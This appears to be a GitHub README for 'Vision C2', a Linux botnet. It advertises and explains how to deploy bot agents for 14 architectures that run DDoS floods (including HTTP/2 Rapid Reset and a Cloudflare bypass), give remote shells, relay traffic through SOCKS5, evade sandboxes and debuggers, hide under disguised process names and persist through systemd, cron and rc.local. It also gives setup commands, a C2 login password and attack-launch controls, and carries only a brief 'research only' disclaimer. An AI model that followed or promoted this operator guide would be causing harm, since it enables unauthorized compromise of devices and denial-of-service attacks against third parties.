
<div align="center">
 
## Vision C2 

### Advanced Linux Botnet Framework

> 14-arch cross-compiled agents. DDoS, RCE, SOCKS5 pivoting. TLS 1.3 transport.
> Anti-analysis, anti-sandbox, anti-debugger. Full daemon persistence.
> Zero plaintext in the binary. Driven through a real-time Go TUI.

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
[![Changelog](https://img.shields.io/badge/Changelog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)

[Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=ll4muq5OBFU)

<img width="907" height="840" alt="CNC Dashboard (BubbleTea TUI)" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />

</div>

---

## Why Vision?

**Automated setup** — A Python wizard handles everything. Pick your options, deploy, done.

**Encrypted transport** — Full TLS 1.3 bot↔C2 sessions over port 443. Blends with normal HTTPS traffic.

**Real anti-analysis** — 40+ VM/sandbox/debugger signatures. Parent process debugger detection. Sandboxes never reach the main loop.

**Evasion Focused** — All strings AES-128-CTR encrypted at build time with split-key derivation. C2 address passes through a 6-layer decode pipeline (AES → Base64 → XOR → RC4 → byte-sub → MD5 check). Custom UPX packing on every binary.

**HMAC registration** — MD5-based challenge-response with per-campaign sync tokens. Prevents replay attacks.

**Triple-redundant persistence** — Systemd service + cron watchdog + rc.local entry. Kill one, the others bring it back.

**SOCKS5 proxy** — Full pivoting with RFC 1929 auth. Runtime credential updates pushed through the TUI — no redeployment needed.

**Remote shell** — Command execution with full output capture. Built-in Linux shortcuts and post-exploit helpers.

**Daemonized stealth** — Fork+setsid with disguised process names. Single-instance PID lock prevents duplicate agents.

**Layer 7 arsenal** — Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487), TLS bypass, full proxy list support.

---

## Attack Methods

<details>
<summary><b>Layer 4 — Network/Transport</b></summary>
<br>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol 47, max payload |
| **DNS Flood** | Randomized query types, DNS reflection |

</details>

<details>
<summary><b>Layer 7 — Application</b></summary>
<br>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487), batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>

---

## Installation

### Prerequisites

```bash
sudo apt update && sudo apt install -y openssl git wget gcc python3 screen netcat

# Go 1.23+
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512 MB / 1 GB | 2 GB+ / 5 GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for your **C2 address**, **admin port** (default `420`), and **TLS cert details**. Output:

```
bins/              → 14 bot binaries (multi-arch)
cnc/certificates/  → server.crt + server.key
server             → CNC binary
setup_config.txt   → Config summary
```

To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bots afterward.

### Starting the CNC

```bash
./server              # TUI mode (default)
./server --split      # Telnet mode on admin port
```

Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).

Split mode: `nc YOUR_IP 420` → type `spamtec` → login.

---

## TUI Navigation

| Key | Action |
|---|---|
| `↑/↓` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Views

**Bot List** — Live bot status. `Enter` = shell, `b` = broadcast shell, `l` = attack, `i` = info, `p` = persist, `r` = reinstall, `k` = kill.

**Remote Shell** — Interactive shell to a single bot. `Ctrl+F` = clear, `Ctrl+P` = persist, `Ctrl+R` = reinstall.

**Broadcast Shell** — Command all bots at once. `Ctrl+A` = filter by arch, `Ctrl+G` = filter by RAM, `Ctrl+B` = limit bot count.

**Launch Attack** — Select method, target, port, duration → `l` to fire.

**Ongoing Attacks** — Progress bars + time remaining. `s` = stop all.

**SOCKS Manager** — `s` = start (set port + optional user:pass via tab), `x` = stop. Update creds live: `!socksauth <user> <pass>`.

**Connection Logs** — Bot connect/disconnect history.

---

## Bot Binaries

| Binary | Arch | Target |
|---|---|---|
| `ethd0` | x86_64 (amd64) | Servers, desktops |
| `kworkerd0` | x86 (386) | 32-bit systems |
| `ip6addrd` | ARM64 | RPi 4, phones |
| `mdsync1` | ARMv7 | RPi 2/3 |
| `deferwqd` | MIPS | Routers |
| `devfreqd0` | MIPSLE | Routers (little-endian) |
| *+ 8 more* | Various | IoT, embedded |

> Full binary map: [`build.sh`](tools/build.sh)

---

## Architecture

Vision has two components:

**`cnc/`** — The Command & Control server. Dual-listener: TLS on 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`.

**`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → singleton lock → environment detection → install persistence → DNS-resolve C2 → connect with reconnect loop.

### Source Map

| File | Purpose |
|---|---|
| `bot/config.go` | Runtime config: AES data blobs, config seed, sync token, build tag |
| `bot/connection.go` | TLS connection, multi-method DNS resolution (DoH → UDP → A record → raw) |
| `bot/attacks.go` | All L4/L7 flood methods |
| `bot/opsec.go` | AES decryption, key derivation, environment detection |
| `bot/persist.go` | Systemd, cron, rc.local persistence |
| `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
| `cnc/ui.go` | Bubble Tea TUI — views, keybindings, rendering |
| `cnc/cmd.go` | Command dispatch and routing |
| `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
| `cnc/miscellaneous.go` | RBAC, user auth, utilities |

---

## Documentation

| | |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`SETUP.md`](Docs/SETUP.md) | Setup guide |

---

## Legal Disclaimer

**For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.

---

<div align="center">

**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) | [@synacket](https://x.com/synacket)

</div>
